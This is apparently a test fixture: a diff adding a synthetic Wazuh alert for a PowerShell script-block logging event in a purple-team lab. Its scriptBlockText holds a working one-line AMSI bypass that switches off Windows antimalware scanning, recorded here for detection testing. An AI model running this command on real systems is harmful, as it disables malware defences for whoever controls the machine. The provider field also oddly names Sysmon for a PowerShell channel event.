@@ -1,0 +1,32 @@
+{
+  "timestamp": "2026-10-25T06:16:08.000Z",
+  "rule": {
+    "level": 0,
+    "description": "Test event"
+  },
+  "agent": {
+    "id": "001",
+    "name": "WS01",
+    "ip": "10.10.10.20"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "40fc5e7e-62bf-414f-b7f7-03017f449bea",
+  "data": {
+    "win": {
+      "system": {
+        "eventID": "4104",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "computer": "WS01.corp.purpleforge.local",
+        "providerName": "Microsoft-Windows-Sysmon",
+        "systemTime": "2026-10-25T06:16:08.000Z",
+        "eventRecordID": "74257"
+      },
+      "eventdata": {
+        "user": "CORP\\redteam",
+        "scriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+      }
+    }
+  }
+}
